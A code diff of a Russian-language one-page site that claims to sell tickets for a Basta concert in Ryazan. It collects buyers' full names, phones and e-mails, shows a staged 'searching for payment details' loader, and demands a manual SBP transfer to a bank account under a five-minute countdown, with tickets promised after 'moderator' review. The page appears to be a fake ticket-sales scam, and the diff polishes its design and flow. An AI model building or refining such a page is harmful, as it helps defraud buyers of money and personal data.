@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Баста в Рязани — Билеты</title>
+    <title>Баста — Концерт в Рязани</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -23,11 +23,11 @@
             min-height: 100vh;
         }
 
-        /* Задний фон с фото */
+        /* Задний фон */
         .hero-bg {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.6), rgba(0,0,0,0.9)), 
-                        url('https://images.wallpaperscraft.ru/image/single/concert_performance_hands_118151_1280x720.jpg'); /* Стабильный фон */
+            background: linear-gradient(to bottom, rgba(0,0,0,0.7), rgba(0,0,0,0.95)), 
+                        url('https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?q=80&w=2070&auto=format&fit=crop'); 
             background-size: cover; background-position: center;
             z-index: -1;
         }
@@ -44,15 +44,14 @@
             background: rgba(255,255,255,0.08); border-radius: 20px; padding: 15px; margin-bottom: 30px;
             border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(15px);
         }
-        .stadium-map img { width: 100%; border-radius: 10px; display: block; filter: brightness(0.9); }
+        .stadium-map img { width: 100%; border-radius: 10px; display: block; filter: brightness(0.8) contrast(1.2); }
         .map-label { text-align: center; font-size: 11px; color: var(--gray); margin-top: 10px; text-transform: uppercase; }
 
-        /* Карточки билетов */
+        /* Билеты */
         .ticket-item {
-            background: rgba(28, 28, 30, 0.8); border-radius: 18px; padding: 20px; margin-bottom: 12px;
+            background: rgba(28, 28, 30, 0.85); border-radius: 18px; padding: 20px; margin-bottom: 12px;
             display: flex; justify-content: space-between; align-items: center;
-                       backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05);
-        }
+            backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05);        }
         .t-name { font-weight: 600; font-size: 18px; }
         .t-price { color: var(--gray); font-size: 14px; margin-top: 4px; }
         
@@ -63,7 +62,7 @@
         }
         .count-val { font-weight: 600; min-width: 20px; text-align: center; font-size: 18px; }
 
-        /* Итоговая панель */
+        /* Итоговая кнопка */
         .bottom-bar {
             position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
             width: calc(100% - 40px); max-width: 460px;
@@ -73,17 +72,18 @@
         }
         .bottom-bar span { font-weight: 800; font-size: 20px; }
 
-        /* Ввод данных */
-        .form-title { font-size: 28px; font-weight: 800; margin-bottom: 25px; text-align: left; }
+        /* Поля ввода */
+        .form-title { font-size: 28px; font-weight: 800; margin-bottom: 25px; }
         input {
             width: 100%; padding: 18px; border-radius: 14px; border: 1px solid #333;
             background: #111; color: #fff; margin-bottom: 15px; font-size: 16px; outline: none;
         }
         input:focus { border-color: var(--accent); }
 
-        .btn-main { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; width: 100%; font-weight: 700; font-size: 17px; cursor: pointer; }
+        .btn-main { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; width: 100%; font-weight: 700; font-size: 17px; cursor: pointer; transition: 0.3s; }
+        .btn-main:hover { opacity: 0.9; }
 
-        /* Оплата */
+        /* Реквизиты */
         .pay-card { background: #fff; color: #000; padding: 25px; border-radius: 20px; margin-top: 20px; }
         .pay-card p { font-size: 13px; color: #666; margin-bottom: 4px; }
         .pay-card b { font-size: 22px; display: block; margin-bottom: 15px; }
@@ -105,8 +105,8 @@
 
 <div class="hero-bg"></div>
 
-<div class="container">
-    <!-- Страница 1: Выбор -->
+<div class="container" id="main-app">
+    <!-- Стр 1: Билеты -->
     <div id="step1">
         <div class="top-badge">Рязань Афиша</div>
         <div class="main-info">
@@ -119,11 +119,11 @@
         </div>
 
         <div class="stadium-map">
-            <img src="https://avatars.mds.yandex.net/get-afisha/411440/e33682948f95c024564c7f0709b30c04/origin" alt="Схема">
-            <div class="map-label">Выберите сектор и количество билетов</div>
+            <img src="https://avatars.mds.yandex.net/get-afisha/411440/e33682948f95c024564c7f0709b30c04/origin" alt="Схема зала">
+            <div class="map-label">Выберите количество билетов</div>
         </div>
 
-        <div id="tickets">
+        <div id="tickets-list">
             <div class="ticket-item">
                 <div><div class="t-name">Танцпол</div><div class="t-price">2 500 ₽</div></div>
                 <div class="counter">
@@ -149,29 +149,26 @@
                 </div>
             </div>
         </div>
-
-        <div style="height: 100px;"></div> <!-- Отступ под кнопку -->
+        <div style="height: 120px;"></div>
         <div class="bottom-bar" id="checkoutBtn" onclick="goToStep2()" style="display: none;">
             <div>Билетов: <span id="totalCount">0</span></div>
             <div>К оплате: <span id="totalPrice">0 ₽</span></div>
         </div>
     </div>
 
-    <!-- Страница 2: Данные -->
+    <!-- Стр 2: Данные -->
     <div id="step2" class="hidden">
         <div class="form-title">Ваши данные</div>
         <input type="text" id="fio" placeholder="ФИО полностью">
-        <!-- Поле телефона с фиксированным +7 -->
-        <input type="tel" id="phone" value="+7 " oninput="handlePhone(this)" onfocus="if(this.value==='') this.value='+7 '">
+        <input type="tel" id="phone" value="+7 " oninput="fixPhone(this)" onfocus="fixPhone(this)">
         <input type="email" id="email" placeholder="E-mail для получения билета">
         <button class="btn-main" onclick="goToStep3()">Продолжить</button>
     </div>
 
-    <!-- Страница 3: Оплата -->
+    <!-- Стр 3: Оплата -->
     <div id="step3" class="hidden">
         <h2 style="text-align: center;">Оплата СБП</h2>
         <div class="timer" id="timer">05:00</div>
-        
         <div class="pay-card">
             <p>Сумма перевода:</p>
             <b id="finalAmount">0 ₽</b>
@@ -180,16 +177,15 @@
             <p>Банк получателя:</p>
             <b>КБ Солидарность</b>
         </div>
-        
         <button class="btn-main" style="margin-top: 25px; background: var(--accent); color: #fff;" onclick="verify()">Я оплатил(а)</button>
     </div>
 
-    <!-- Финал -->
+    <!-- Стр 4: Финал -->
     <div id="stepFinal" class="hidden" style="text-align: center; margin-top: 50px;">
-        <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+        <div style="font-size: 60px; margin-bottom: 20px;">📨</div>
         <h2>Заявка принята</h2>
         <p style="color: var(--gray); margin-top: 15px; line-height: 1.6;">
-            Ожидайте подтверждение оплаты. Билеты будут отправлены на вашу почту в течение 24 часов после проверки транзакции модератором.
+            Билеты будут отправлены на вашу почту в течение 24 часов после проверки транзакции модератором.
         </p>
     </div>
 
@@ -204,8 +200,7 @@
     const prices = { t1: 2500, t2: 4500, t3: 8000 };
     let counts = { t1: 0, t2: 0, t3: 0 };
 
-    // Фиксация +7
-    function handlePhone(input) {
+    function fixPhone(input) {
         if (!input.value.startsWith('+7 ')) {
             input.value = '+7 ';
         }
@@ -214,24 +209,19 @@
     function changeCount(id, delta) {
         counts[id] = Math.max(0, counts[id] + delta);
         document.getElementById(id).innerText = counts[id];
-        updateTotal();
-    }
-
-    function updateTotal() {
         let total = (counts.t1 * prices.t1) + (counts.t2 * prices.t2) + (counts.t3 * prices.t3);
         let count = counts.t1 + counts.t2 + counts.t3;
         const btn = document.getElementById('checkoutBtn');
         if (count > 0) {
             btn.style.display = 'flex';
             document.getElementById('totalCount').innerText = count;
-            document.getElementById('totalPrice').innerText = total.toLocaleString() + ' ₽';
-        } else {
+            document.getElementById('totalPrice').innerText = total.toLocaleString() + ' ₽';} else {
             btn.style.display = 'none';
         }
     }
 
     function showLoader(time, text, nextId) {
-        document.querySelectorAll('.container > div:not(#loader)').forEach(d => d.classList.add('hidden'));
+        document.querySelectorAll('#main-app > div:not(#loader)').forEach(d => d.classList.add('hidden'));
         const l = document.getElementById('loader');
         l.style.display = 'block';
         document.getElementById('loaderText').innerText = text;
@@ -247,10 +237,7 @@
     }
 
     function goToStep3() {
-        const f = document.getElementById('fio').value;
-        const e = document.getElementById('email').value;
-        if(f.length < 5 || !e.includes('@')) { alert('Заполните данные верно'); return; }
-
+        if(document.getElementById('fio').value.length < 5) { alert('Введите ФИО'); return; }
         showLoader(4000, "Поиск свободных реквизитов...", "step3");
         document.getElementById('finalAmount').innerText = document.getElementById('totalPrice').innerText;
         startTimer(300);
@@ -261,15 +248,13 @@
     }
 
     function startTimer(duration) {
-        let timer = duration, min, sec;
-        const timerInt = setInterval(() => {
-            min = parseInt(timer / 60, 10);
-            sec = parseInt(timer % 60, 10);
-            document.getElementById('timer').innerText = (min < 10 ? "0"+min : min) + ":" + (sec < 10 ? "0"+sec : sec);
-            if (--timer < 0) { clearInterval(timerInt); }
+        let t = duration, m, s;
+        const intrvl = setInterval(() => {
+            m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
+            document.getElementById('timer').innerText = (m<10?"0"+m:m)+":"+(s<10?"0"+s:s);
+            if (--t < 0) clearInterval(intrvl);
         }, 1000);
     }
 </script>
-
 </body>
 </html>
